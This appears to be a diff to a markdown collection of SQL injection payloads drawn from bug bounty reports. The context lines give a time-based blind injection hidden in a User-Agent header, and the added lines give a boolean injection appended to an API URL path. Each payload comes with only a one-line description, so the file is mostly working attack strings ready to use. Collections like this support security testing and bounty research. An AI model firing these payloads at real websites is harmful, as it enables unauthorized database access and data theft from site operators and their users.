@@ -23,3 +23,8 @@ you can inject by this payload <br>
 ## report #297478
  SQL injection vulnerability in the website that affects the endpoint can be exploited via the User-Agent HTTP header. <br>
  Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+
+
+## report #2051931
+The server does not perform sanitization on user input, allowing an attacker to inject arbitrary SQL commands into a query. <br>
+/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--
